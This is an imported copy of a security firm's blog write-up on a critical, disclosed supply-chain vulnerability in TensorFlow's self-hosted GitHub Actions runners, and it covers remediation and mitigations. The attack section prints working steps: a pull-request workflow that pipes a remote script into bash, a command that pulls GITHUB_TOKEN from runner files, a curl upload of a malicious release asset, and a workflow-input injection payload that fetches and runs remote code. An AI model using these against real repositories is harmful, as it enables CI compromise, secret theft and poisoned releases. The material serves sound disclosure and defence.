---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-01-15_tensorflow-supply-chain-compromise-via-self-hosted-runner-attack.md
original_filename: 2024-01-15_tensorflow-supply-chain-compromise-via-self-hosted-runner-attack.md
title: TensorFlow Supply Chain Compromise via Self-Hosted Runner Attack
category: documents
detected_topics:
- supply-chain
- api-security
- cloud-security
- idor
- access-control
- ssrf
tags:
- imported
- documents
- supply-chain
- api-security
- cloud-security
- idor
- access-control
- ssrf
language: en
raw_sha256: 829866d6c13664d7fda0e50ee79e38be39b4410461b5fb4db0d86c9b53c5f72d
text_sha256: 49f86abbc8d67e17a9430b4b682bf08dad86fef3235d7612f19ca4e34ba3b614
ingested_at: '2026-06-28T07:32:29Z'
sensitivity: unknown
redactions_applied: false
---

# TensorFlow Supply Chain Compromise via Self-Hosted Runner Attack

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-01-15_tensorflow-supply-chain-compromise-via-self-hosted-runner-attack.md
- Source Type: markdown
- Detected Topics: supply-chain, api-security, cloud-security, idor, access-control, ssrf
- Ingested At: 2026-06-28T07:32:29Z
- Redactions Applied: False
- Raw SHA256: `829866d6c13664d7fda0e50ee79e38be39b4410461b5fb4db0d86c9b53c5f72d`
- Text SHA256: `49f86abbc8d67e17a9430b4b682bf08dad86fef3235d7612f19ca4e34ba3b614`


## Content

---
title: "TensorFlow Supply Chain Compromise via Self-Hosted Runner Attack"
page_title: "TensorFlow Supply Chain Compromise via Self-Hosted Runner Attack | Praetorian"
url: "https://www.praetorian.com/blog/tensorflow-supply-chain-compromise-via-self-hosted-runner-attack/"
final_url: "https://www.praetorian.com/blog/tensorflow-supply-chain-compromise-via-self-hosted-runner-attack/"
authors: ["Adnan Khan (@adnanthekhan)", "John Stawinski"]
programs: ["Google (OSS)", "TensorFlow"]
bugs: ["CI/CD", "Supply chain attack"]
publication_date: "2024-01-15"
added_date: "2024-01-25"
source: "pentester.land/writeups.json"
original_index: 545
---

Skip to content

**Meet Constantine – Find Mythos-level vulnerabilities in your code. It proves them, patches them, PRs them back. Autonomously.**

[ Download Datasheet ](/resources/constantine-datasheet/)

[ ![Praetorian](https://www.praetorian.com/wp-content/uploads/2025/10/praetorian-logo-final-white.svg) ](https://www.praetorian.com)

  * Platform  Close Platform Open Platform

#### [Praetorian Guard Platform](/guard/)

  * [Adversarial Exposure Validation](https://www.praetorian.com/guard/breach-attack-simulation/)
  * [Attack Surface Management](https://www.praetorian.com/guard/attack-surface-management/)
  * [Continuous Penetration Testing](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [Continuous Threat Exposure Management](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [Cyber Threat Intelligence](https://www.praetorian.com/guard/threat-intelligence/)
  * [Unified Vulnerability Management](https://www.praetorian.com/guard/vulnerability-management/)
  * [Adversarial Exposure Validation](https://www.praetorian.com/guard/breach-attack-simulation/)
  * [Attack Surface Management](https://www.praetorian.com/guard/attack-surface-management/)
  * [Continuous Penetration Testing](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [Continuous Threat Exposure Management](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [Cyber Threat Intelligence](https://www.praetorian.com/guard/threat-intelligence/)
  * [Unified Vulnerability Management](https://www.praetorian.com/guard/vulnerability-management/)

  * Services  Close Services Open Services

#### [Penetration Testing Services](/penetration-testing/)

  * [LLM Penetration Testing](https://www.praetorian.com/services/ai-ml-penetration-testing/)
  * [Application Penetration Testing](https://www.praetorian.com/services/application-penetration-testing/)
  * [Automotive Penetration Testing](https://www.praetorian.com/services/automotive-penetration-testing/)
  * [Cloud Penetration Testing](https://www.praetorian.com/services/cloud-penetration-testing/)
  * [IoT Penetration Testing](https://www.praetorian.com/services/iot-penetration-testing/)
  * [Network Penetration Testing](https://www.praetorian.com/services/network-penetration-testing/)
  * [LLM Penetration Testing](https://www.praetorian.com/services/ai-ml-penetration-testing/)
  * [Application Penetration Testing](https://www.praetorian.com/services/application-penetration-testing/)
  * [Automotive Penetration Testing](https://www.praetorian.com/services/automotive-penetration-testing/)
  * [Cloud Penetration Testing](https://www.praetorian.com/services/cloud-penetration-testing/)
  * [IoT Penetration Testing](https://www.praetorian.com/services/iot-penetration-testing/)
  * [Network Penetration Testing](https://www.praetorian.com/services/network-penetration-testing/)

#### [Advanced Offensive Security](/advanced-penetration-testing/)

  * [Assumed Breached](https://www.praetorian.com/services/assumed-breached-exercise/)
  * [Attack Path Mapping](https://www.praetorian.com/guard/attack-path-mapping/)
  * [CI/CD Attack Chains](https://www.praetorian.com/services/ci-cd-security-engagement/)
  * [Purple Team](https://www.praetorian.com/services/purple-team/)
  * [Red Team](https://www.praetorian.com/services/red-team/)
  * [Assumed Breached](https://www.praetorian.com/services/assumed-breached-exercise/)
  * [Attack Path Mapping](https://www.praetorian.com/guard/attack-path-mapping/)
  * [CI/CD Attack Chains](https://www.praetorian.com/services/ci-cd-security-engagement/)
  * [Purple Team](https://www.praetorian.com/services/purple-team/)
  * [Red Team](https://www.praetorian.com/services/red-team/)

#### [Continuous Offensive Security](/guard/)

  * [Adversarial Exposure Validation](https://www.praetorian.com/guard/breach-attack-simulation/)
  * [Attack Surface Management](https://www.praetorian.com/guard/attack-surface-management/)
  * [Continuous Penetration Testing](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [Continuous Threat Exposure Management](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [Cyber Threat Intelligence](https://www.praetorian.com/guard/threat-intelligence/)
  * [Unified Vulnerability Management](https://www.praetorian.com/guard/vulnerability-management/)
  * [Adversarial Exposure Validation](https://www.praetorian.com/guard/breach-attack-simulation/)
  * [Attack Surface Management](https://www.praetorian.com/guard/attack-surface-management/)
  * [Continuous Penetration Testing](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [Continuous Threat Exposure Management](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [Cyber Threat Intelligence](https://www.praetorian.com/guard/threat-intelligence/)
  * [Unified Vulnerability Management](https://www.praetorian.com/guard/vulnerability-management/)

  * Why Praetorian  Close Why Praetorian Open Why Praetorian

#### [Customer Case Studies](/customer-success-in-cybersecurity/)

  * [21st Century Fox](https://www.praetorian.com/customer-success-in-cybersecurity/21st-century-fox/)
  * [Cushman & Wakefield](https://www.praetorian.com/customer-success-in-cybersecurity/cushman-wakefield/)
  * [Bookings Holdings](https://www.praetorian.com/customer-success-in-cybersecurity/cybersecurity-partnership-bookings-holdings/)
  * [Nielsen](https://www.praetorian.com/customer-success-in-cybersecurity/nielsen/)
  * [OpenTable](https://www.praetorian.com/customer-success-in-cybersecurity/open-table/)
  * [Priceline](https://www.praetorian.com/customer-success-in-cybersecurity/priceline/)
  * [Samsung](https://www.praetorian.com/customer-success-in-cybersecurity/samsung-electronics/)
  * [X](https://www.praetorian.com/customer-success-in-cybersecurity/x-twitter/)
  * [Zoom](https://www.praetorian.com/customer-success-in-cybersecurity/zoom-2/)
  * [See All Customers](https://www.praetorian.com/customer-success-in-cybersecurity/)
  * [21st Century Fox](https://www.praetorian.com/customer-success-in-cybersecurity/21st-century-fox/)
  * [Cushman & Wakefield](https://www.praetorian.com/customer-success-in-cybersecurity/cushman-wakefield/)
  * [Bookings Holdings](https://www.praetorian.com/customer-success-in-cybersecurity/cybersecurity-partnership-bookings-holdings/)
  * [Nielsen](https://www.praetorian.com/customer-success-in-cybersecurity/nielsen/)
  * [OpenTable](https://www.praetorian.com/customer-success-in-cybersecurity/open-table/)
  * [Priceline](https://www.praetorian.com/customer-success-in-cybersecurity/priceline/)
  * [Samsung](https://www.praetorian.com/customer-success-in-cybersecurity/samsung-electronics/)
  * [X](https://www.praetorian.com/customer-success-in-cybersecurity/x-twitter/)
  * [Zoom](https://www.praetorian.com/customer-success-in-cybersecurity/zoom-2/)
  * [See All Customers](https://www.praetorian.com/customer-success-in-cybersecurity/)

#### Resources

  * [Security Blog](https://www.praetorian.com/blog/)
  * [Resource Library](https://www.praetorian.com/resources/)
  * [Security 101](/security-101/)
  * [Labs](https://www.praetorian.com/praetorian-labs/)
  * [GitHub](https://github.com/praetorian-inc/)
  * [MITRE ATT&CK](https://www.praetorian.com/mitre-attack/)
  * [Speaking and Events](https://www.praetorian.com/speaking-and-events/)
  * [Warlocks](https://wherewarlocksstayuplate.com/)
  * [Security Blog](https://www.praetorian.com/blog/)
  * [Resource Library](https://www.praetorian.com/resources/)
  * [Security 101](/security-101/)
  * [Labs](https://www.praetorian.com/praetorian-labs/)
  * [GitHub](https://github.com/praetorian-inc/)
  * [MITRE ATT&CK](https://www.praetorian.com/mitre-attack/)
  * [Speaking and Events](https://www.praetorian.com/speaking-and-events/)
  * [Warlocks](https://wherewarlocksstayuplate.com/)

#### Use Cases

  * [ASM for Healthcare](https://www.praetorian.com/guard/attack-surface-management-healthcare/)
  * [Bug Bounty Cost Reduction](https://www.praetorian.com/services/bug-bounty-cost-reduction/)
  * [FDA Testing and Monitoring](https://www.praetorian.com/services/fda-testing-monitoring/)
  * [Mergers and Acquisitions](https://www.praetorian.com/services/mergers-acquisitions/)
  * [Ransomware Prevention](https://www.praetorian.com/services/ransomware-prevention/)
  * [Rogue IT Identification](https://www.praetorian.com/services/rogue-it-identification/)
  * [Tool and Vendor Consolidation](https://www.praetorian.com/services/tool-vendor-consolidation/)
  * [Vendor Risk Management](https://www.praetorian.com/services/vendor-risk-management/)
  * [ASM for Healthcare](https://www.praetorian.com/guard/attack-surface-management-healthcare/)
  * [Bug Bounty Cost Reduction](https://www.praetorian.com/services/bug-bounty-cost-reduction/)
  * [FDA Testing and Monitoring](https://www.praetorian.com/services/fda-testing-monitoring/)
  * [Mergers and Acquisitions](https://www.praetorian.com/services/mergers-acquisitions/)
  * [Ransomware Prevention](https://www.praetorian.com/services/ransomware-prevention/)
  * [Rogue IT Identification](https://www.praetorian.com/services/rogue-it-identification/)
  * [Tool and Vendor Consolidation](https://www.praetorian.com/services/tool-vendor-consolidation/)
  * [Vendor Risk Management](https://www.praetorian.com/services/vendor-risk-management/)

  * About  Close About Open About

#### [About Praetorian](/praetorian-offensive-cybersecurity-company/)

  * [Overview](https://www.praetorian.com/about-us/)
  * [In the News](/news/news/)
  * [Press Releases](/news/press-release/)
  * [Contact Us](https://www.praetorian.com/contact-us/)
  * [Overview](https://www.praetorian.com/about-us/)
  * [In the News](/news/news/)
  * [Press Releases](/news/press-release/)
  * [Contact Us](https://www.praetorian.com/contact-us/)

#### [Join Praetorian](/careers/#job-opening)

  * [Culture](https://www.praetorian.com/work-at-praetorian/)
  * [People Ops Blog](/people-ops/)
  * [New Hire Survival Guide](/wp-content/uploads/2024/11/Praetorian-Survival-Guide.pdf)
  * [Tech Challenges​](https://www.praetorian.com/challenges/)
  * [Job Postings](https://www.praetorian.com/careers/#job-opening)
  * [Culture](https://www.praetorian.com/work-at-praetorian/)
  * [People Ops Blog](/people-ops/)
  * [New Hire Survival Guide](/wp-content/uploads/2024/11/Praetorian-Survival-Guide.pdf)
  * [Tech Challenges​](https://www.praetorian.com/challenges/)
  * [Job Postings](https://www.praetorian.com/careers/#job-opening)

  * [ Platform Demo  ](/praetorian-guard-demo/)

  * [ Contact Us  ](/contact-us/)

  * [CI/CD Security](https://www.praetorian.com/category/ci-cd-security/)

# TensorFlow Supply Chain Compromise via Self-Hosted Runner Attack

  * [Adnan Khan](https://www.praetorian.com/author/adnan-khan/), [John Stawinski](https://www.praetorian.com/author/john-stawinski/)
  * [ January 15, 2024 ](https://www.praetorian.com/blog/2024/01/15/)

![](https://www.praetorian.com/wp-content/uploads/2024/06/TensorFlaw-C.png)

## Introduction

With the recent rise and adoption of artificial intelligence technologies, open-source frameworks such as TensorFlow are prime targets for attackers seeking to conduct software supply chain attacks. Over the last several years, Praetorian engineers have become adept at performing highly complex attacks on GitHub Actions CI/CD environments, designing proprietary tools to aid their attacks, and presenting their research at ShmooCon and BSides SF 2023.

At ShmooCon 2023, Praetorian released [Gato](https://github.com/praetorian-inc/gato), an open-source tool for GitHub Actions pipeline enumeration and attack, with a particular focus on self-hosted GitHub Actions runners. We ran the tool on large organizations to discover vulnerable repositories, and Gato identified TensorFlow as potentially vulnerable to a poisoned pipeline execution attack.

As a result of our research, we were able to identify a series of CI/CD misconfigurations that an attacker could abuse to conduct a supply chain compromise of TensorFlow releases on GitHub and PyPi by compromising TensorFlow’s build agents via a malicious pull request. Praetorian disclosed this vulnerability to Google, and it was accepted as a critical ‘Supply chain compromise’ vulnerability.

In this blog, we will discuss our methodology for identifying the vulnerability, walk through the underlying issues that caused the bug, and explain the steps an attacker could take to compromise TensorFlow releases. We will conclude with Tensorflow’s remediation steps and our thoughts on the overall process.

## TensorFlow Description

[TensorFlow](https://github.com/tensorflow/tensorflow) is “an end-to-end open-source platform for machine learning. It has a comprehensive, flexible ecosystem of tools, libraries, and community resources that lets researchers push the state-of-the-art in ML and developers easily build and deploy ML-powered applications.” TensorFlow was originally developed by researchers and engineers working within the Machine Intelligence team at Google Brain to conduct research in machine learning and neural networks. Currently, TensorFlow has 180,000 stars on GitHub and is used by popular tech companies such as Google, Lenovo, Intel, and Qualcomm.

## Impact

Exploiting these vulnerabilities allows an external attacker to:

  * Upload malicious releases to the official TensorFlow GitHub repository
  * Gain RCE on a self-hosted GitHub runner
  * Retrieve a GitHub Personal Access Token (PAT) for the tensorflow-jenkins user

## GitHub Actions Background

Before we dive into the exploit, let’s take a minute to understand what we attacked. TensorFlow, like thousands of other organizations, uses GitHub Actions for their CI/CD process. GitHub Actions allow the execution of code specified within workflows as part of the CI/CD process.

For example, let’s say TensorFlow wants to run a set of tests when a GitHub user submits a pull request. TensorFlow can define these tests in a yaml workflow file, used by GitHub Actions, and configure the workflow to run on the `pull_request` trigger. Now, whenever a user submits a pull request, the tests will execute on a runner. This way, repository maintainers don’t need to manually test everyone’s code before merging.

GitHub Actions workflows execute on two types of build runners. One type is GitHub’s hosted runners, which GitHub maintains and hosts in their own environment. The other class is self-hosted runners.

## Self-Hosted Runners

Self-hosted runners are build agents hosted by end users running the Actions runner agent on their own infrastructure. As one would expect, securing and protecting the runners is the responsibility of end users, not GitHub. For this reason, GitHub recommends against using self-hosted runners on public repositories.

By default, when a self-hosted runner is attached to a repository or an organization runner group that a public repository has access to, any workflow running in that repository’s context can use that runner.

For workflows on default and feature branches, this isn’t an issue. Users must have write access to update branches within repositories. The problem is that this also applies to workflows from fork pull requests – this default setting allows any contributor to execute code on the self-hosted runner by submitting a malicious PR.

If the self-hosted runner is configured using the default steps, it will be a non-ephemeral self-hosted runner. This means that the malicious workflow can start a process in the background that will continue to run after the job completes, and modifications to files (such as programs on the path, etc.) will persist.

## Identifying the Vulnerability

### Identifying Self-Hosted Runners

The first step in identifying this vulnerability was confirming the use of self-hosted runners. To identify self-hosted runners, we ran [Gato](https://github.com/praetorian-inc/gato), a tool developed by Praetorian. Among other things, Gato can enumerate the existence of self-hosted runners within a repository by examining GitHub workflow files and run logs. Gato identified a persistent, self-hosted runner that ran ARM64 Linux CI builds. We looked at the TensorFlow repository to confirm the Gato output.

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%2072'%3E%3C/svg%3E)

_Gato Output_

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20860'%3E%3C/svg%3E)

_Confirming self-hosted runners in GitHub Actions logs._

### Determining Workflow Approval Requirements

The second step was determining the workflow approval settings. The default setting for workflow execution from fork PRs is to require approval only for accounts that have not previously contributed to the repository. There is an option to allow workflow approval for all Fork PRs, including previous contributors, so we set out to discover the status of this setting. By viewing the pull request (PR) history, we found several PRs from previous contributors that triggered `pull_request` workflows without requiring approval. This indicated that workflow approval was not required for Fork PRs from previous contributors.

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20878'%3E%3C/svg%3E)

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20484'%3E%3C/svg%3E)

_PR #61443 received no approvals, yet the ARM_CI workflow ran on `pull_request`._

### Searching for Impact

Compromising self-hosted runners can have a wide range of impacts, from trivial to critical. We provide explicit steps to compromise the self-hosted runner below, but first, let’s understand TensorFlow’s use of GitHub Actions to determine the access an attacker would have if they compromised the self-hosted runner. By examining the workflow logs, we observed that self-hosted runners with the same name were used in multiple workflow runs. This meant the runner was non-ephemeral, so an attacker could persist on the runner even after their PR job finished by forking off their own process.

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20736'%3E%3C/svg%3E)

_The “runner6” runner was used by several workflows. Additionally, this workflow contained a step that stopped old Docker containers, indicating the runner had executed previous jobs._

This particular runner was one of a handful of self-hosted runners in a TensorFlow runner group named `Default`. An attacker could use the malicious pull request to compromise any runner in this group or all at once using the `runs-on: matrix` strategy. Hypothetically, let’s say an attacker compromised the `runner6` runner. The impact of runner compromise typically depends on the permission levels of the `GITHUB_TOKEN` assigned to subsequent builds, branch protection settings in place for the repository, network positioning of the build machine, and repository secrets.

### GITHUB_TOKEN Permissions

Typically, a workflow needs to checkout the repository to the runner’s filesystem, whether to run tests defined in the repository, commit changes, or even publish releases. To perform these operations, the workflow can use a `GITHUB_TOKEN`. `GITHUB_TOKEN` permissions can vary from read-only access to extensive write privileges over the repository. The important aspect is that if a workflow executes on a self-hosted runner and uses a `GITHUB_TOKEN`, then that token will be on the runner for the duration of that build. Searching through the workflow logs, we found that the `arm-ci-extended-cpp.yml` workflow also ran on the self-hosted runner. The logs confirmed that this workflow used a `GITHUB_TOKEN` with extensive write permissions.

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20962'%3E%3C/svg%3E)

This token would only be valid for the life of that particular build. However, there are techniques to extend the build length once you are on the runner. Because the `GITHUB_TOKEN` had the `Contents:write` permission, it could upload releases to https://github.com/tensorflow/tensorflow/releases/. An attacker that compromised one of these `GITHUB_TOKEN`s could add their own files to the Release Assets. For example, they could upload an asset claiming to be a pre-compiled, ready-to-use binary and add a release note with instructions to run and download the binary. Any users that downloaded the binary would then be running the attacker’s code. If the current source code assets are not pinned to the release commit, the attacker could overwrite those assets directly.

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20370'%3E%3C/svg%3E)

#### Branch Protection Settings

The **contents:write** permissions also meant an attacker could use the token to push code directly to the TensorFlow repository. However, TensorFlow’s default branches were protected, so an attacker would need to smuggle their code into a feature branch and hope that it got merged before detection. It is possible to modify the commit user when making a Git commit, so an attacker could attempt to attribute a commit to the feature branch author in order to hide their actions.

#### Network Positioning

It is difficult to determine the network access of a runner from run logs. In general, self-hosted runners could have access to the organization’s internal network or cloud environments. We did not confirm if this was the case with TensorFlow.

#### Repository Secrets

The TensorFlow repository used GitHub secrets to allow the runners to access sensitive systems during the automated release process. We analyzed the workflow files to determine which secrets the repository used.

While investigating the `arm-cd.yml` workflow, we noticed that it used the `AWS_PYPI_ACCOUNT_TOKEN` to authenticate to PyPi before uploading TensorFlow pip wheels and that this workflow ran on the self-hosted runner. This meant an attacker who compromised the runner could also compromise this secret.

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20664'%3E%3C/svg%3E)

An attacker could also use the GITHUB_TOKEN’s permissions to compromise the `JENKINS_TOKEN` repository secret, even though this secret was not used within workflows that ran on the self-hosted runners.

## Executing the Attack

Given the risk of disrupting Google systems and the prominence of TensorFlow, we opted not to execute this attack in the wild. However, these are the steps we would have taken to compromise TensorFlow releases.

### 1\. Fix a Typo

First, we’d need to become a contributor to the TensorFlow repository. Becoming a contributor to a popular repository is typically a trivial task. For example, we could find a typo in a README and then submit a PR for the typo fix. Once the PR was merged into the main branch, we’d be a contributor. As of writing – TensorFlow has over 3,400 contributors.

### 2\. Implant the Runner

To take control of the runner, we would first fork the repository. In our fork, we’d remove all existing workflows that run on the `pull_request` trigger to minimize our presence in the workflow logs. Next, we’d add a new workflow file to deploy persistence on the build agent. Here is a workflow file we could use to retrieve a bash script and execute it on the self-hosted runner:
  
  
  name: SH Runner POC
  on:
  pull_request
  jobs:
  unit-tests:
  runs-on: [self-hosted, linux, ARM64]
  steps:
  - name: unit-tests
  continue-on-error: true
  run: |
  curl -sSfL https://git.githubusercontent.com/ouruser/dummyval/shell.sh | bash

Our bash script, stored in a GitHub gist, could be any Command-and-Control (C2) system, but one that we’ve had success with is installing our own self-hosted GitHub runner on the runner and then using a C2 repository with a simple workflow to execute commands. This method ensures our C2 payload will evade EDR and won’t get blocked by any network or firewall restrictions because it uses the same communication mechanisms as the underlying runner. Once we created our payload, we’d submit a draft PR from our TensorFlow fork. The draft status would prevent a request from being sent to code owners from the change to the workflow yaml file. After receiving our C2 callback, we’d force-push the code in the draft PR back to the main commit. The following commands will close the PR and hide obvious indications of malicious activity.
  
  
  git reset --soft HEAD~1
  git push --force

### 3\. Upload Release to GitHub

Once we were on the runner, we’d pivot to stealing secrets. We’d monitor the workflow logs to wait for a build to execute on the runner that was not from a fork PR. When that occurred, we’d run the following command to steal the `GITHUB_TOKEN` from the runner’s working directory:
  
  
  find /home/ubuntu/actions-runner/_work -type f -name config | xargs cat

Using the GitHub token, we could execute the following API request to upload a malicious binary to a GitHub release:
  
  
  curl -L 
  -X POST 
  -H "Accept: application/vnd.github+json" 
  -H "Authorization: Bearer $STOLEN_TOKEN" 
  -H "X-GitHub-Api-Version: 2022-11-28" 
  -H "Content-Type: application/octet-stream" 
  "https://uploads.github.com/repos/tensorflow/tensorflow/releases/:release_id:/assets?name=:malicious_release:" 
  --data-binary ":path_to_local_malicious_release:"

### 4\. Steal PyPi Credentials

To compromise PyPi credentials, we’d monitor workflow logs for the `arm-cd.yml` workflow to run on the compromised runner. While it was running, we’d monitor running processes or dump the runner’s memory to retrieve the PyPi token. An attacker could use these credentials to authenticate to PyPi and upload our malicious wheel.

### 5\. Steal Jenkins Token GitHub PAT

Lastly, we’d compromise a GITHUB_TOKEN and abuse it to steal the JENKINS_TOKEN secret. This secret is not used by a self-hosted runner, but there was a way to steal it using the GITHUB_TOKEN and a `workflow_dispatch` event. The JENKINS_TOKEN is a GitHub PAT for the tensorflow-jenkins user ([https://github.com/tensorflow-jenkins](https://github.com/tensorflow-jenkins))

The `release-branch-cherrypick.yml` workflow uses the JENKINS_TOKEN secret and runs on `workflow_dispatch`. In order to steal this secret, we would need to execute code within this workflow run, and steal the token from the runner’s memory. The GITHUB_TOKEN cannot alter workflow files, even with full write permissions, so we would need to find a way to control the code executed by the workflow.

If we look at the workflow file, it contains two string input parameters:
  
  
  name: Release Branch Cherrypick
  
  
  on:
  workflow_dispatch:
  inputs:
  # We use this instead of the "run on branch" argument because GitHub looks
  # on that branch for a workflow.yml file, and we'd have to cherry-pick
  # this file into those branches.
  **release_branch** :
  description: 'Release branch name (e.g. r2.9)'
  required: true
  **type: string**
  **git_commit** :
  description: 'Git commit to cherry-pick'
  required: true
  **type: string**

The workflow also contained a run step:
  
  
  name: Get some helpful info for formatting
  id: cherrypick
  
  
  run: |
  git config --global user.name "TensorFlow Release Automation"
  git config --global user.email "[[email protected]](/cdn-cgi/l/email-protection)"
  git fetch origin master
  **git cherry-pick ${{ github.event.inputs.git_commit }}**
  echo "SHORTSHA=$(git log -1 ${{ github.event.inputs.git_commit }} --format="%h")" >> "$GITHUB_OUTPUT"
  echo "TITLE=$(git log -1 ${{ github.event.inputs.git_commit }} --format="%s")" >> "$GITHUB_OUTPUT”

If you’ve read [Long Live the Pwn Request: Hacking Microsoft GitHub Repositories and More](https://www.praetorian.com/blog/pwn-request-hacking-microsoft-github-repositories-and-more/), or are familiar with GitHub Actions injection, you might see where this is going. Since the `git_commit` value is passed directly into the script, it is possible to inject code into the run step.

From here, we would issue a dispatch event using GitHub’s REST API containing an injection payload, the payload could look like this:
  
  
  Hacked;{curl,-sSfL,gist.githubusercontent.com/Path/To/Your/payload.sh}${IFS}|${IFS}bash;exit 0

The Gist would contain code to steal the secret from the workflow. There are several known techniques to accomplish this, as documented by Karim Rahal in [Leaking Secrets from GitHub Actions](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/). Gato would then be able to enumerate the PAT access and scope to search for lateral movement opportunities.

## Remediation

TensorFlow remediated these vulnerabilities by requiring approval for workflows submitted from all fork PRs, including the PRs of previous contributors. Additionally, TensorFlow changed the `GITHUB_TOKEN` permissions to read-only for workflows that ran on self-hosted runners.

With these new controls, an attacker would have to smuggle their malicious code into a PR and hope the repository maintainer doesn’t notice it when they approve their workflow. Then, the impact of self-hosted runner compromise would be limited because they couldn’t use the `GITHUB_TOKEN` to perform any write operations.

## Submission Timeline

**August 1st, 2023** – Report Submitted to Google VRP

**August 2nd, 2023** – Report Triaged

**August 14th, 2023** – Report Accepted

**August 22nd, 2023** – Awarded as a [“Supply Chain compromise” within Google’s “Standard OSS Projects” tier](https://bughunters.google.com/about/rules/6521337925468160/google-open-source-software-vulnerability-reward-program-rules#reward-amounts).

**December 20th, 2023** – Marked as Fixed – _this simply means that Google closed all tickets created as a result of this report, the attack path was mitigated in August when Google changed the PR workflow approval setting._

The vulnerability reporting process was very smooth and Google’s security team was able to fully understand the vulnerability and its risks despite us not overtly exploiting the vulnerability. [This is not always the case](https://www.praetorian.com/blog/azure-b2c-crypto-misuse-and-account-compromise/) with large organization’s security disclosure programs, and we’d like to give Google a shout out for scoping their VRP to include repository configurations and Actions workflows.

## Mitigation Steps

In general, the best way to use self-hosted runners and protect the repository from these attacks is to take the following steps:

  1. Require approval to run workflows on the `pull_request` trigger for all outside fork PRs, even if they are contributors.
  2. Move the self-hosted runner group from the repository to an organization group (such as one only for public repositories), and [configuring the group to only run on specific workflows](https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-self-hosted-runners/managing-access-to-self-hosted-runners-using-groups#changing-which-workflows-can-access-a-runner-group) that have already been committed to a protected branch, then reference that workflow as a [reusable workflow](https://github.blog/2021-11-29-github-actions-reusable-workflows-is-generally-available/).
  3. If possible, ensure that only ephemeral self-hosted runners (1 build, 1 clean runner) are used for public repository builds.

## Conclusion

Praetorian performs proactive vulnerability research to identify vulnerabilities in commonly used applications. As part of our research into TensorFlow, we identified a series of CI/CD misconfigurations which when combined lead to compromise of TensorFlow releases.

Similar CI/CD attacks are on the rise as more organizations automate their CI/CD processes. AI/ML companies are particularly vulnerable as many of their workflows require significant compute power that isn’t available in GitHub-hosted runners, thus the prevalence of self-hosted runners.

## References

  * <https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/>
  * <https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/>
  * <https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/>
  * <https://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/>
  * <https://github.com/praetorian-inc/gato>
  * <https://github.com/nikitastupin/pwnhub/blob/main/writings/github-token.md>
  * <https://docs.github.com/en/actions/>
  * <https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/>
  * <https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution>
  * <https://slsa.dev/spec/v1.0/verifying-systems>

## About the Authors

![Adnan Khan](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E)

### [Adnan Khan](https://www.praetorian.com/author/adnan-khan/)

Adnan focuses on Red-Teaming, DevOps Security, and Exploit Development.

[ ](https://www.linkedin.com/in/adnanekhan)

![John Stawinski](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E)

### [John Stawinski](https://www.praetorian.com/author/john-stawinski/)

John is a Red Team Operator at Praetorian, focused on covert operations, CICD + supply chain security, corporate engagements, and public vulnerability research.

[ ](https://www.linkedin.com/in/john-stawinski-72ba87191/)

## Catch the Latest

Catch our latest exploits, news, articles, and events.

[](https://www.praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion/)

  * [Offensive Security](https://www.praetorian.com/category/offensive-security/), [Vulnerability Research](https://www.praetorian.com/category/vulnerability-research/)

  * June 19, 2026

[](https://www.praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion/)

## [GhostPack Necromancy: Reforging C# Tools with WasmForge](https://www.praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion/)

[ Read More ](https://www.praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion/)

[](https://www.praetorian.com/blog/ai-vulnerability-research-freebsd-kernel/)

  * [Offensive Security](https://www.praetorian.com/category/offensive-security/), [Vulnerability Research](https://www.praetorian.com/category/vulnerability-research/)

  * June 17, 2026

[](https://www.praetorian.com/blog/ai-vulnerability-research-freebsd-kernel/)

## [FreeBSoD: Leveraging Language Models to Find and Exploit Kernel Bugs (Part 1 of 2)](https://www.praetorian.com/blog/ai-vulnerability-research-freebsd-kernel/)

[ Read More ](https://www.praetorian.com/blog/ai-vulnerability-research-freebsd-kernel/)

[](https://www.praetorian.com/blog/sharing-is-caring-smb-secret-scanning-with-sulla/)

  * [Uncategorized](https://www.praetorian.com/category/uncategorized/)

  * June 16, 2026

[](https://www.praetorian.com/blog/sharing-is-caring-smb-secret-scanning-with-sulla/)

## [Sharing is Caring: SMB Secret Scanning with Sulla](https://www.praetorian.com/blog/sharing-is-caring-smb-secret-scanning-with-sulla/)

